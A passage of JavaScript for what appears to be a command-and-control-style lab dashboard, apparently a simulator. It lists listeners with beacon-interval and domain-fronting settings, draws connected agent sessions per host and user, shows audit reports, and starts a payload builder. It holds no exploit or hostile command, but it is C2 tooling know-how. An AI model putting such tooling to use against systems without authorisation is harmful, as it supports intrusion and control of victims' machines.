    const hasActivity = Boolean(stats.last_activity) || agentsConnected > 0 || heartbeats > 0 || events > 0;
    const activityTime = Date.parse(stats.last_activity || listener?.last_modified || listener?.created_at || "") || 0;

    return [hasActivity ? 1 : 0, activityTime, heartbeats, events, agentsConnected];
}

function pickPreferredListenerId(listeners) {
    if (!Array.isArray(listeners) || !listeners.length) return null;

    const storedId = getStoredSelectedListenerId();
    if (storedId && listeners.some((listener) => listener.listener_id === storedId)) {
        return storedId;
    }

    const sorted = [...listeners].sort((left, right) => {
        const leftPriority = getListenerPriority(left);
        const rightPriority = getListenerPriority(right);

        for (let index = 0; index < leftPriority.length; index += 1) {
            if (leftPriority[index] !== rightPriority[index]) {
                return rightPriority[index] - leftPriority[index];
            }
        }

        return String(left?.name || left?.listener_id || "").localeCompare(String(right?.name || right?.listener_id || ""));
    });

    return sorted[0]?.listener_id || null;
}

async function loadListeners() {
    try {
        const res = await fetch(`${API}/listeners/`);
        const listeners = await res.json();
        cachedListeners = Array.isArray(listeners) ? listeners : [];
        populatePayloadListenerSelect(selectedListenerId);
        renderSessionsGraph();
    } catch (e) {
        addConsoleLog(`[-] listeners fetch failed: ${e.message}`, "error");
        renderSessionsGraph();
    }
}

async function loadAuditReports(options = {}) {
    const { silent = false } = options;

    if (!selectedListenerId) {
        cachedAuditReports = [];
        selectedAuditReportId = null;
        selectedAuditReportDetail = null;
        renderAuditReports();
        return;
    }

    const listenerId = selectedListenerId;
    try {
        showAuditLoadingSkeleton();
        const res = await fetch(`${API}/listeners/${encodeURIComponent(listenerId)}/audit-reports`);
        const data = await res.json();

        if (listenerId !== selectedListenerId) {
            return;
        }

        if (!res.ok) {
            cachedAuditReports = [];
            selectedAuditReportId = null;
            selectedAuditReportDetail = null;
            renderAuditReports(data.detail || "Failed to load audit reports.");
            if (!silent) addConsoleLog(`[-] audit reports failed: ${data.detail || res.statusText}`, "error");
            return;
        }

        cachedAuditReports = Array.isArray(data.reports) ? data.reports : [];
        if (selectedAuditReportId && !cachedAuditReports.some((report) => report.report_id === selectedAuditReportId)) {
            selectedAuditReportId = null;
            selectedAuditReportDetail = null;
        }
        if (!selectedAuditReportId && cachedAuditReports[0]?.report_id) {
            selectedAuditReportId = cachedAuditReports[0].report_id;
        }

        renderAuditReports();
        if (!silent) toast("Audit report list loaded", "info");

        if (selectedAuditReportId) {
            await loadAuditReportDetail(selectedAuditReportId, { silent: true });
        } else {
            renderAuditPreview();
        }
    } catch (e) {
        if (listenerId !== selectedListenerId) {
            return;
        }
        cachedAuditReports = [];
        selectedAuditReportId = null;
        selectedAuditReportDetail = null;
        renderAuditReports("Unable to load audit reports.");
        if (!silent) addConsoleLog(`[-] audit reports fetch failed: ${e.message}`, "error");
    }
}

async function loadAuditReportDetail(reportId, options = {}) {
    const { silent = false } = options;
    if (!selectedListenerId || !reportId) {
        selectedAuditReportDetail = null;
        window.selectedAuditReportDetail = null;
        renderAuditPreview();
        return;
    }

    const listenerId = selectedListenerId;

    try {
        const res = await fetch(`${API}/listeners/${encodeURIComponent(listenerId)}/audit-reports/${encodeURIComponent(reportId)}`);
        const data = await res.json();

        if (listenerId !== selectedListenerId || reportId !== selectedAuditReportId) {
            return;
        }

        if (!res.ok) {
            selectedAuditReportDetail = null;
            window.selectedAuditReportDetail = null;
            renderAuditPreview(data.detail || "Failed to load report details.");
            return;
        }

        selectedAuditReportDetail = data;
        window.selectedAuditReportDetail = data; // Stocker pour les recommandations
        
        renderAuditPreview();
        if (!silent) toast("Audit report loaded", "info");
        
        // NE RIEN FAIRE D'AUTRE - Pas de changement d'onglet
        // Les recommandations se mettront à jour uniquement quand l'utilisateur cliquera sur l'onglet
        
    } catch (e) {
        selectedAuditReportDetail = null;
        window.selectedAuditReportDetail = null;
        renderAuditPreview("Unable to load report details.");
    }
}
function renderAuditReports(emptyMessage = "") {
    const titleEl = document.getElementById("audit-panel-title");
    const tbody = document.getElementById("audit-reports-tbody");
    if (!titleEl || !tbody) return;

    const selectedListener = cachedListeners.find((listener) => listener.listener_id === selectedListenerId);
    if (!selectedListenerId || !selectedListener) {
        titleEl.textContent = "Audit Reports";
        tbody.innerHTML = `
            <tr class="loading">
                <td colspan="5">
                    No listener selected.
                    <button id="audit-go-listeners-btn" class="inline-audit-btn" type="button">Go to Listener tab</button>
                </td>
            </tr>
        `;
        const goBtn = document.getElementById("audit-go-listeners-btn");
        if (goBtn) {
            goBtn.addEventListener("click", () => switchBottomTab("listeners"));
        }
        selectedAuditReportId = null;
        selectedAuditReportDetail = null;
        renderAuditPreview("No audit report selected.");
        syncAuditButtons();
        return;
    }

    const filteredReports = cachedAuditReports
        .filter((report) => activeAuditRiskFilter === "all" || String(report.risk_level || "").toLowerCase() === activeAuditRiskFilter)
        .sort((left, right) => (Date.parse(right.created_at || "") || 0) - (Date.parse(left.created_at || "") || 0));

    titleEl.textContent = `Audit Reports: ${selectedListener.name || selectedListener.listener_id} [${selectedListener.listener_id}] (${filteredReports.length})`;
    tbody.innerHTML = "";

    if (!filteredReports.length) {
        const baseMessage = cachedAuditReports.length
            ? `No reports yet for the selected risk filter (${activeAuditRiskFilter.toUpperCase()}).`
            : "No reports yet for this listener.";
        const message = emptyMessage || baseMessage;
        tbody.innerHTML = `<tr class="loading"><td colspan="5">${message}</td></tr>`;
        selectedAuditReportId = null;
        selectedAuditReportDetail = null;
        renderAuditPreview(`No reports yet for ${selectedListener.name || selectedListener.listener_id} [${selectedListener.listener_id}].`);
        syncAuditButtons();
        return;
    }

    if (selectedAuditReportId && !filteredReports.some((report) => report.report_id === selectedAuditReportId)) {
        selectedAuditReportId = null;
        selectedAuditReportDetail = null;
    }
    if (!selectedAuditReportId && filteredReports[0]?.report_id) {
        selectedAuditReportId = filteredReports[0].report_id;
    }

    filteredReports.forEach((report) => {
    const tr = document.createElement("tr");
    tr.className = report.report_id === selectedAuditReportId ? "selected" : "";
    tr.addEventListener("click", async () => {
        selectedAuditReportId = report.report_id;
        renderAuditReports();
        await loadAuditReportDetail(report.report_id, { silent: true });
    });

        const risk = String(report.risk_level || "UNKNOWN").toLowerCase();
        tr.innerHTML = `
            <td title="${report.machine_name ?? "-"}">${report.machine_name ?? "-"}</td>
            <td><span class="audit-risk ${risk}">${(report.risk_level ?? "UNKNOWN").toString()}</span></td>
            <td>${report.finding_count ?? 0}</td>
            <td title="${report.created_at ?? "-"}">${formatDateTime(report.created_at)}</td>
            <td title="${report.report_id ?? "-"}">${report.report_id ?? "-"}</td>
        `;
        tbody.appendChild(tr);
    });

    syncAuditButtons();
}

function renderAuditPreview(message = "") {
    const metaEl = document.getElementById("audit-preview-meta");
    const jsonEl = document.getElementById("audit-preview-json");
    if (!metaEl || !jsonEl) return;

    const selectedListener = cachedListeners.find((listener) => listener.listener_id === selectedListenerId);
    if (!selectedListenerId || !selectedListener) {
        metaEl.textContent = message || "Select a listener to inspect audit reports.";
        jsonEl.value = "";
        syncAuditButtons();
        return;
    }

    if (!selectedAuditReportId) {
        metaEl.textContent = message || `Select an audit report for ${selectedListener.name || selectedListener.listener_id} [${selectedListener.listener_id}].`;
        jsonEl.value = "";
        syncAuditButtons();
        return;
    }

    if (!selectedAuditReportDetail || selectedAuditReportDetail.report_id !== selectedAuditReportId) {
        metaEl.textContent = message || `Loading audit report ${selectedAuditReportId}...`;
        jsonEl.value = "";
        syncAuditButtons();
        return;
    }

    const report = selectedAuditReportDetail;
    metaEl.textContent = [
        `Listener : ${selectedListener.name || selectedListener.listener_id}`,
        `Listener ID : ${selectedListener.listener_id || "-"}`,
        `Report ID : ${report.report_id ?? "-"}`,
        `Host : ${report.machine_name ?? "-"}`,
        `User : ${report.username ?? "-"}`,
        `Risk : ${report.risk_level ?? "UNKNOWN"}`,
        `Findings : ${report.finding_count ?? 0}`,
        `Stored : ${formatDateTime(report.created_at)}`,
        `File : ${report.filename ?? "-"}`,
    ].join("\n");
    jsonEl.value = report.report_json || "";
    syncAuditButtons();
}

function syncAuditButtons() {
    const refreshBtn = document.getElementById("audit-refresh-btn");
    const downloadBtn = document.getElementById("audit-download-btn");
    const copyBtn = document.getElementById("audit-copy-btn");
    const riskFilter = document.getElementById("audit-risk-filter");
    const hasListener = Boolean(selectedListenerId);
    const hasReport = Boolean(selectedAuditReportDetail?.report_json);
    if (refreshBtn) {
        refreshBtn.disabled = !hasListener;
        refreshBtn.title = hasListener ? "Refresh reports for selected listener" : "Select a listener first";
    }
    if (downloadBtn) {
        downloadBtn.disabled = !hasReport;
        downloadBtn.title = hasReport ? "Download selected JSON report" : "Select an audit report first";
    }
    if (copyBtn) {
        copyBtn.disabled = !hasReport;
        copyBtn.title = hasReport ? "Copy selected JSON report" : "Select an audit report first";
    }
    if (riskFilter) {
        riskFilter.disabled = !hasListener;
        riskFilter.title = hasListener ? "Filter reports by risk level" : "Select a listener first";
    }
}

function getSelectedAuditReportFilename() {
    const fallbackReportId = selectedAuditReportDetail?.report_id || selectedAuditReportId || "audit-report";
    const rawName = String(selectedAuditReportDetail?.filename || fallbackReportId).trim();
    if (!rawName) return "audit-report.json";
    return rawName.toLowerCase().endsWith(".json") ? rawName : `${rawName}.json`;
}

function downloadBlobFile(content, filename, contentType = "application/json;charset=utf-8") {
    const blob = new Blob([content], { type: contentType });
    const url = URL.createObjectURL(blob);
    const anchor = document.createElement("a");
    anchor.href = url;
    anchor.download = filename;
    document.body.appendChild(anchor);
    anchor.click();
    anchor.remove();
    window.setTimeout(() => URL.revokeObjectURL(url), 1000);
}

async function downloadSelectedAuditReportJson() {
    if (!selectedAuditReportDetail?.report_json) {
        addConsoleLog("[-] select an audit report first", "error");
        return;
    }

    try {
        downloadBlobFile(selectedAuditReportDetail.report_json, getSelectedAuditReportFilename());
        toast("Audit report downloaded", "success");
    } catch (e) {
        addConsoleLog(`[-] download audit JSON failed: ${e.message}`, "error");
    }
}

async function copySelectedAuditReportJson() {
    if (!selectedAuditReportDetail?.report_json) {
        addConsoleLog("[-] select an audit report first", "error");
        return;
    }

    try {
        if (navigator.clipboard?.writeText) {
            await navigator.clipboard.writeText(selectedAuditReportDetail.report_json);
            toast("Audit report JSON copied", "success");
            return;
        }

        addConsoleLog("[-] clipboard API unavailable", "error");
    } catch (e) {
        addConsoleLog(`[-] copy audit JSON failed: ${e.message}`, "error");
    }
}

async function loadListenerProfiles() {
    try {
        const res = await fetch(`${API}/listeners/profiles/list`);
        const profiles = await res.json();
        cachedListenerProfiles = Array.isArray(profiles) ? profiles : [];
    } catch (e) {
        // keep silent; older API might not have profiles
        cachedListenerProfiles = [];
    }
}

function renderListenersTable() {
    const tbody = document.getElementById("listeners-tbody");
    if (!tbody) return;
    tbody.innerHTML = "";

    if (!cachedListeners.length) {
        tbody.innerHTML = '<tr class="loading"><td colspan="7">No listeners</td></tr>';
        selectedListenerId = null;
        storeSelectedListenerId(null);
        syncListenerButtons();
        return;
    }

    if (selectedListenerId && !cachedListeners.some((listener) => listener.listener_id === selectedListenerId)) {
        selectedListenerId = null;
        storeSelectedListenerId(null);
    }

    if (!selectedListenerId) {
        selectedListenerId = pickPreferredListenerId(cachedListeners);
        storeSelectedListenerId(selectedListenerId);
    }

    cachedListeners.forEach((l) => {
        const tr = document.createElement("tr");
        tr.className = (l.listener_id && l.listener_id === selectedListenerId) ? "selected" : "";
        tr.addEventListener("click", async () => {
            selectedListenerId = l.listener_id || null;
            storeSelectedListenerId(selectedListenerId);
            selectedAuditReportId = null;
            selectedAuditReportDetail = null;
            renderListenersTable();
            await loadAuditReports({ silent: true });
        });
        const status = (l.status || (l.enabled ? "online" : "offline")).toString().toLowerCase();
        tr.innerHTML = `
            <td>${l.name ?? "-"}</td>
            <td>${l.protocol ?? "-"}</td>
            <td>${l.host ?? "-"}</td>
            <td>${l.port ?? "-"}</td>
            <td>${l.profile ?? "-"}</td>
            <td>${status}</td>
            <td title="${l.listener_id ?? "-"}">${l.listener_id ?? "-"}</td>
        `;
        tbody.appendChild(tr);
    });

    syncListenerButtons();
}

function syncListenerButtons() {
    const removeBtn = document.getElementById("listener-remove-btn");
    const editBtn = document.getElementById("listener-edit-btn");
    const startBtn = document.getElementById("listener-start-btn");
    const stopBtn = document.getElementById("listener-stop-btn");
    const statsBtn = document.getElementById("listener-stats-btn");
    const exportBtn = document.getElementById("listener-export-btn");
    if (!removeBtn || !editBtn || !startBtn || !stopBtn || !statsBtn || !exportBtn) return;
    const enabled = Boolean(selectedListenerId);
    removeBtn.disabled = !enabled;
    editBtn.disabled = !enabled;
    startBtn.disabled = !enabled;
    stopBtn.disabled = !enabled;
    statsBtn.disabled = !enabled;
    exportBtn.disabled = !enabled;
    const disabledTitle = "Select a listener first";
    const activeTitle = "Action available for selected listener";
    removeBtn.title = enabled ? activeTitle : disabledTitle;
    editBtn.title = enabled ? activeTitle : disabledTitle;
    startBtn.title = enabled ? activeTitle : disabledTitle;
    stopBtn.title = enabled ? activeTitle : disabledTitle;
    statsBtn.title = enabled ? activeTitle : disabledTitle;
    exportBtn.title = enabled ? activeTitle : disabledTitle;
    syncAuditButtons();
    renderSessionsGraph();
}

function switchSessionsView(view) {
    activeSessionsView = view === "graph" ? "graph" : "table";
    const tableView = document.getElementById("sessions-table-view");
    const graphView = document.getElementById("sessions-graph-view");
    const tabTable = document.getElementById("sessions-tab-table");
    const tabGraph = document.getElementById("sessions-tab-graph");
    if (tableView) tableView.classList.toggle("active", activeSessionsView === "table");
    if (graphView) graphView.classList.toggle("active", activeSessionsView === "graph");
    if (tabTable) tabTable.classList.toggle("active", activeSessionsView === "table");
    if (tabGraph) tabGraph.classList.toggle("active", activeSessionsView === "graph");
    if (activeSessionsView === "graph") {
        ensureSessionsGraphCanvasSize();
        renderSessionsGraph();
    }
}

function initSessionsGraph() {
    const canvas = document.getElementById("sessions-graph-canvas");
    const wrap = document.getElementById("sessions-graph-canvas-wrap");
    if (!canvas || !wrap) return;

    sessionsGraphState = {
        canvas,
        wrap,
        dpr: Math.max(1, window.devicePixelRatio || 1),
        panX: 0,
        panY: 0,
        scale: 1,
        nodes: [],
        edges: [],
        isDraggingNode: false,
        dragNodeId: null,
        dragOffsetX: 0,
        dragOffsetY: 0,
        nodePositionOverrides: new Map(),
        hasInitialFit: false,
    };
    sessionsGraphAssets = createSessionsGraphAssets();

    const onResize = () => {
        const changed = ensureSessionsGraphCanvasSize();
        if (changed) {
            renderSessionsGraph();
            fitSessionsGraphToView();
        }
    };

    canvas.addEventListener("mousedown", (event) => {
        if (!sessionsGraphState) return;
        const hit = getDraggableNodeAtCanvasPoint(event);
        if (!hit) return;
        sessionsGraphState.isDraggingNode = true;
        sessionsGraphState.dragNodeId = hit.id;
        sessionsGraphState.dragOffsetX = hit.offsetX;
        sessionsGraphState.dragOffsetY = hit.offsetY;
        canvas.classList.add("dragging");
    });

    window.addEventListener("mouseup", () => {
        if (!sessionsGraphState) return;
        sessionsGraphState.isDraggingNode = false;
        sessionsGraphState.dragNodeId = null;
        canvas.classList.remove("dragging");
    });

    window.addEventListener("mousemove", (event) => {
        if (!sessionsGraphState) return;
        if (sessionsGraphState.isDraggingNode && sessionsGraphState.dragNodeId) {
            const point = getCanvasPoint(event);
            if (!point) return;
            const x = point.x - sessionsGraphState.dragOffsetX;
            const y = point.y - sessionsGraphState.dragOffsetY;
            sessionsGraphState.nodePositionOverrides.set(sessionsGraphState.dragNodeId, { x, y });
            renderSessionsGraph();
            return;
        }
        const hit = getDraggableNodeAtCanvasPoint(event);
        canvas.style.cursor = hit ? "grab" : "default";
    });

    window.addEventListener("resize", onResize);
    const observer = new ResizeObserver(() => onResize());
    observer.observe(wrap);
    onResize();
}

function ensureSessionsGraphCanvasSize() {
    if (!sessionsGraphState) return false;
    const { canvas, wrap, dpr } = sessionsGraphState;
    const rect = wrap.getBoundingClientRect();
    if (!rect.width || !rect.height) return false;
    const targetWidth = Math.max(1, Math.floor(rect.width * dpr));
    const targetHeight = Math.max(1, Math.floor(rect.height * dpr));
    const changed = canvas.width !== targetWidth || canvas.height !== targetHeight;
    if (changed) {
        canvas.width = targetWidth;
        canvas.height = targetHeight;
    }
    return changed;
}

function resetSessionsGraphView() {
    if (!sessionsGraphState) return;
    sessionsGraphState.nodePositionOverrides.clear();
    sessionsGraphState.scale = 1;
    renderSessionsGraph();
}

function fitSessionsGraphToView() {
    if (!sessionsGraphState) return;
    sessionsGraphState.scale = 1;
    renderSessionsGraph();
}

function buildSessionsGraphModel() {
    const filteredAgents = getFilteredAgents();
    const selectedListener = cachedListeners.find((listener) => listener.listener_id === selectedListenerId) || null;
    const listenerLabel = selectedListener?.name || selectedListener?.listener_id || "Control Server";
    const nodes = [{
        id: "listener-node",
        kind: "listener",
        label: listenerLabel,
        sublabel: selectedListener?.listener_id ? `[${selectedListener.listener_id}]` : "No listener selected",
        x: 110,
        y: 42,
        radius: 28,
    }];
    const edges = [];

    if (!filteredAgents.length) return { nodes, edges };

    const listener = nodes[0];
    // AUGMENTER la distance de base
    const baseX = Math.max(500, (sessionsGraphState?.wrap?.clientWidth || 900) * 0.68);
    const topRowY = listener.y;
    // AUGMENTER l'espace entre les agents (radius plus grand)
    const radiusX = Math.max(250, Math.min(450, filteredAgents.length * 60));
    
    filteredAgents.forEach((agent, index) => {
        // Disposer les agents en demi-cercle plus large
        const angle = filteredAgents.length === 1
            ? 0
            : (-Math.PI / 2.5) + (index * (Math.PI / Math.max(1, filteredAgents.length - 1)));
        const health = getAgentHealthSnapshot(agent);
        const nodeId = `agent-${agent.agent_id || index}`;
        const defaultX = baseX + Math.cos(angle) * radiusX;
        const defaultY = topRowY + Math.sin(angle) * 30; // Légère courbe
        const override = sessionsGraphState?.nodePositionOverrides?.get(nodeId);
        
        nodes.push({
            id: nodeId,
            kind: "agent",
            health: health.state,
            os: String(agent.operating_system || "").toLowerCase(),
            label: agent.hostname || agent.username || (agent.agent_id || "agent").slice(0, 8),
            sublabel: `${agent.username || "user"} @ ${agent.operating_system || "unknown"} | ${(agent.agent_id || "").slice(0, 8)}`,
            x: override?.x ?? defaultX,
            y: override?.y ?? defaultY,
            radius: 26,
            draggable: String(agent.operating_system || "").toLowerCase().includes("win"),
        });
        
        edges.push({
            source: listener.id,
            target: nodeId,
            label: health.state === "sleeping" ? "sleeping session" : "session",
            user: agent.username || "unknown",
            type: health.state,
        });
    });

    return { nodes, edges };
}

function renderSessionsGraph() {
    if (!sessionsGraphState || activeSessionsView !== "graph") return;
    ensureSessionsGraphCanvasSize();
    const { canvas, dpr } = sessionsGraphState;
    const ctx = canvas.getContext("2d");
    if (!ctx) return;

    const model = buildSessionsGraphModel();
    sessionsGraphState.nodes = model.nodes;
    sessionsGraphState.edges = model.edges;
    if (!sessionsGraphState.hasInitialFit && model.nodes.length) {
        sessionsGraphState.hasInitialFit = true;
        fitSessionsGraphToView();
        return;
    }

    const width = canvas.width / dpr;
    const height = canvas.height / dpr;
    ctx.setTransform(dpr, 0, 0, dpr, 0, 0);
    ctx.clearRect(0, 0, width, height);

    drawGraphBackdrop(ctx, width, height);
    drawGraphEdges(ctx, model.nodes, model.edges);
    drawGraphNodes(ctx, model.nodes);
    if (model.nodes.length <= 1) {
        ctx.fillStyle = "#9db2d3";
        ctx.font = "12px Segoe UI";
        ctx.textAlign = "left";
        ctx.fillText("No active agent sessions to display.", 12, height - 14);
    }
}

function getCanvasPoint(event) {
    if (!sessionsGraphState?.canvas) return null;
    const rect = sessionsGraphState.canvas.getBoundingClientRect();
    return {
        x: event.clientX - rect.left,
        y: event.clientY - rect.top,
    };
}

function getDraggableNodeAtCanvasPoint(event) {
    if (!sessionsGraphState) return null;
    const point = getCanvasPoint(event);
    if (!point) return null;
    for (let i = sessionsGraphState.nodes.length - 1; i >= 0; i -= 1) {
        const node = sessionsGraphState.nodes[i];
        if (!node?.draggable) continue;
        const width = 62;
        const height = 48;
        const left = node.x - width / 2;
        const top = node.y - height / 2;
        const inside = point.x >= left && point.x <= left + width && point.y >= top && point.y <= top + height;
        if (inside) {
            return { id: node.id, offsetX: point.x - node.x, offsetY: point.y - node.y };
        }
    }
    return null;
}

function drawGraphBackdrop(ctx, width, height) {
    ctx.fillStyle = "#000000";
    ctx.fillRect(0, 0, width, height);
    ctx.strokeStyle = "rgba(35, 74, 128, 0.22)";
    ctx.lineWidth = 1;
    const gap = 28;
    for (let x = 0; x <= width; x += gap) {
        ctx.beginPath();
        ctx.moveTo(x, 0);
        ctx.lineTo(x, height);
        ctx.stroke();
    }
    for (let y = 0; y <= height; y += gap) {
        ctx.beginPath();
        ctx.moveTo(0, y);
        ctx.lineTo(width, y);
        ctx.stroke();
    }
}

function drawGraphEdges(ctx, nodes, edges) {
    const nodeById = new Map(nodes.map((node) => [node.id, node]));
    edges.forEach((edge) => {
        const source = nodeById.get(edge.source);
        const target = nodeById.get(edge.target);
        if (!source || !target) return;

        const lineColor = edge.type === "offline" ? "#f87171" : (edge.type === "sleeping" ? "#fbbf24" : "#3ae85b");
        ctx.strokeStyle = lineColor;
        ctx.setLineDash([4, 3]);
        ctx.lineWidth = 2;
        ctx.beginPath();
        ctx.moveTo(source.x, source.y);
        ctx.lineTo(target.x, target.y);
        ctx.stroke();
        ctx.setLineDash([]);

        const mx = (source.x + target.x) / 2;
        const my = (source.y + target.y) / 2;
        ctx.fillStyle = "#7ffc81";
        ctx.font = "11px Consolas";
        ctx.textAlign = "center";
        ctx.fillText(edge.user || edge.label, mx, my - 6);
    });
}

function drawGraphNodes(ctx, nodes) {
    nodes.forEach((node) => {
        if (node.kind === "listener") {
            drawIconCardNode(ctx, node, sessionsGraphAssets?.listenerIcon, {
                border: "#ff8d4f",
                glow: "rgba(255, 141, 79, 0.25)",
                fill: "rgba(71, 34, 17, 0.92)",
            });
            return;
        }
        const border = node.health === "offline" ? "#f87171" : (node.health === "sleeping" ? "#fbbf24" : "#54a8ff");
        const glow = node.health === "offline" ? "rgba(248,113,113,0.23)" : (node.health === "sleeping" ? "rgba(251,191,36,0.22)" : "rgba(84,168,255,0.22)");
        const icon = node.os.includes("win")
            ? sessionsGraphAssets?.windowsIcon
            : (node.os.includes("linux") ? sessionsGraphAssets?.linuxIcon : sessionsGraphAssets?.hostIcon);
        drawIconCardNode(ctx, node, icon, {
            border,
            glow,
            fill: "rgba(29, 38, 58, 0.95)",
        });
    });
}

function drawIconCardNode(ctx, node, icon, palette) {
    const cardWidth = node.kind === "listener" ? 58 : 62;
    const cardHeight = node.kind === "listener" ? 44 : 48;
    const x = node.x - cardWidth / 2;
    const y = node.y - cardHeight / 2;

    ctx.save();
    ctx.shadowColor = palette.glow;
    ctx.shadowBlur = 16;
    ctx.fillStyle = palette.fill;
    roundRectPath(ctx, x, y, cardWidth, cardHeight, 10);
    ctx.fill();
    ctx.restore();

    ctx.strokeStyle = palette.border;
    ctx.lineWidth = 2;
    roundRectPath(ctx, x, y, cardWidth, cardHeight, 10);
    ctx.stroke();

    if (icon?.complete) {
        const iconSize = node.kind === "listener" ? 22 : 24;
        ctx.drawImage(icon, node.x - (iconSize / 2), node.y - (iconSize / 2), iconSize, iconSize);
    }

    ctx.fillStyle = "#edf4ff";
    ctx.font = "11px Segoe UI";
    ctx.textAlign = "center";
    ctx.fillText(node.label || "-", node.x, y + cardHeight + 14);
    if (node.sublabel) {
        ctx.fillStyle = "#95a4bf";
        ctx.font = "10px Consolas";
        ctx.fillText(node.sublabel, node.x, y + cardHeight + 28);
    }
}

function roundRectPath(ctx, x, y, w, h, r) {
    const radius = Math.min(r, w / 2, h / 2);
    ctx.beginPath();
    ctx.moveTo(x + radius, y);
    ctx.lineTo(x + w - radius, y);
    ctx.quadraticCurveTo(x + w, y, x + w, y + radius);
    ctx.lineTo(x + w, y + h - radius);
    ctx.quadraticCurveTo(x + w, y + h, x + w - radius, y + h);
    ctx.lineTo(x + radius, y + h);
    ctx.quadraticCurveTo(x, y + h, x, y + h - radius);
    ctx.lineTo(x, y + radius);
    ctx.quadraticCurveTo(x, y, x + radius, y);
    ctx.closePath();
}

function createSessionsGraphAssets() {
    const makeSvgImage = (svg) => {
        const img = new Image();
        img.src = `data:image/svg+xml;utf8,${encodeURIComponent(svg)}`;
        return img;
    };

    const listenerIcon = makeSvgImage(`
        <svg xmlns="http://www.w3.org/2000/svg" width="64" height="64" viewBox="0 0 64 64">
            <rect x="6" y="6" width="52" height="52" rx="12" fill="#131722" stroke="#c556ff" stroke-width="2"/>
            <path d="M13 30 C18 16 27 10 32 10 C37 10 46 16 51 30 L44 30 C41 22 36 18 32 18 C28 18 23 22 20 30 Z" fill="#8b3dff"/>
            <path d="M18 31 C18 25 24 20 32 20 C40 20 46 25 46 31 L46 41 C46 46 40 50 32 50 C24 50 18 46 18 41 Z" fill="#1f2634"/>
            <ellipse cx="27" cy="34" rx="2.2" ry="2.6" fill="#7bf7ff"/>
            <ellipse cx="37" cy="34" rx="2.2" ry="2.6" fill="#7bf7ff"/>
            <path d="M26 41 C28 43 36 43 38 41" stroke="#d7e0ff" stroke-width="2" stroke-linecap="round" fill="none"/>
            <path d="M22 30 C24 35 28 37 32 37 C36 37 40 35 42 30" stroke="#b26dff" stroke-width="2" fill="none"/>
            <circle cx="49" cy="15" r="3" fill="#ff4d8d"/>
        </svg>
    `);

    const windowsIcon = makeSvgImage(`
        <svg xmlns="http://www.w3.org/2000/svg" width="64" height="64" viewBox="0 0 64 64">
            <rect x="10" y="10" width="44" height="44" rx="6" fill="#1f2e4a" stroke="#66b2ff" stroke-width="2"/>
            <path d="M17 20 L30 18 L30 31 L17 31 Z" fill="#6fc3ff"/>
            <path d="M34 17 L47 15 L47 31 L34 31 Z" fill="#90d4ff"/>
            <path d="M17 34 L30 34 L30 47 L17 45 Z" fill="#53b7ff"/>
            <path d="M34 34 L47 34 L47 49 L34 47 Z" fill="#7ac8ff"/>
        </svg>
    `);

    const linuxIcon = makeSvgImage(`
        <svg xmlns="http://www.w3.org/2000/svg" width="64" height="64" viewBox="0 0 64 64">
            <rect x="10" y="10" width="44" height="44" rx="6" fill="#162335" stroke="#81e6a3" stroke-width="2"/>
            <ellipse cx="32" cy="22" rx="9" ry="10" fill="#111"/>
            <ellipse cx="32" cy="36" rx="13" ry="14" fill="#111"/>
            <ellipse cx="28" cy="21" rx="1.8" ry="2.4" fill="#fff"/>
            <ellipse cx="36" cy="21" rx="1.8" ry="2.4" fill="#fff"/>
            <polygon points="32,26 29,29 35,29" fill="#f5d76e"/>
        </svg>
    `);

    const hostIcon = makeSvgImage(`
        <svg xmlns="http://www.w3.org/2000/svg" width="64" height="64" viewBox="0 0 64 64">
            <rect x="10" y="14" width="44" height="30" rx="4" fill="#253753" stroke="#9eb8dd" stroke-width="2"/>
            <rect x="18" y="48" width="28" height="4" rx="2" fill="#7f94b5"/>
            <circle cx="18" cy="28" r="2" fill="#7fffb2"/>
            <circle cx="24" cy="28" r="2" fill="#7fffb2"/>
            <circle cx="30" cy="28" r="2" fill="#7fffb2"/>
        </svg>
    `);

    return { listenerIcon, windowsIcon, linuxIcon, hostIcon };
}

function openListenerModal(mode = "create") {
    const title = document.getElementById("listener-modal-title");
    const idField = document.getElementById("listener-id");
    const nameEl = document.getElementById("listener-name");
    const protocolEl = document.getElementById("listener-protocol");
    const profileEl = document.getElementById("listener-profile");
    const hostEl = document.getElementById("listener-host");
    const portEl = document.getElementById("listener-port");
    const sslEl = document.getElementById("listener-ssl");
    const intervalEl = document.getElementById("listener-interval");
    const uaEl = document.getElementById("listener-ua");
    const domainFrontEl = document.getElementById("listener-domain-front");
    const configJsonEl = document.getElementById("listener-config-json");
    const modal = document.getElementById("listener-modal");

    if (!title || !idField || !nameEl || !protocolEl || !profileEl || !hostEl || !portEl || !sslEl || !intervalEl || !uaEl || !domainFrontEl || !configJsonEl || !modal) {
        addConsoleLog("[-] listener modal elements missing (hard refresh Ctrl+F5)", "error");
        return;
    }

    // Populate profiles list (best effort)
    if (cachedListenerProfiles.length) {
        const current = profileEl.value;
        profileEl.innerHTML = "";
        cachedListenerProfiles.forEach((p) => {
            const opt = document.createElement("option");
            opt.value = p.type;
            opt.textContent = p.type;
            profileEl.appendChild(opt);
        });
        if (current) profileEl.value = current;
    }

    if (mode === "edit") {
        const l = cachedListeners.find(x => x.listener_id === selectedListenerId);
        if (!l) {
            addConsoleLog("[-] select a listener first", "error");
            return;
        }
        title.textContent = "Edit Listener";
        idField.value = l.listener_id || "";
        nameEl.value = l.name || "";
        protocolEl.value = (l.protocol || "https").toLowerCase();
        profileEl.value = (l.profile || "default").toLowerCase();
        hostEl.value = l.host || "0.0.0.0";
        portEl.value = String(l.port ?? 443);
        sslEl.checked = Boolean(l.use_ssl ?? (protocolEl.value === "https"));
        intervalEl.value = String(l.beacon_interval ?? 5);
        uaEl.value = l.user_agent || "";
        domainFrontEl.value = l.domain_front || "";
        configJsonEl.value = l.config ? JSON.stringify(l.config, null, 2) : "";
    } else {
        title.textContent = "Create Listener";
        idField.value = "";
        nameEl.value = "";
        protocolEl.value = "https";
        profileEl.value = "default";
        hostEl.value = "127.0.0.1";
        portEl.value = "443";
        sslEl.checked = true;
        intervalEl.value = "5";
        uaEl.value = "LabSimulator/1.0";
        domainFrontEl.value = "";
        configJsonEl.value = "";
    }

    modal.classList.add("active");
}

function closeListenerModal() {
    document.getElementById("listener-modal").classList.remove("active");
}

// ==========================================
// Payload Builder (safe JSON-only)
// ==========================================
function formatPayloadListenerOption(listener) {
    const name = String(listener?.name || "").trim();
    const listenerId = String(listener?.listener_id || "").trim();
    if (name && listenerId && name !== listenerId) {
        return `${name} (${listenerId})`;
    }
    return name || listenerId || "Unnamed listener";
}

function populatePayloadListenerSelect(preferredListenerId = selectedListenerId) {
    const targetListenerEl = document.getElementById("payload-target-listener");
    if (!targetListenerEl) return;

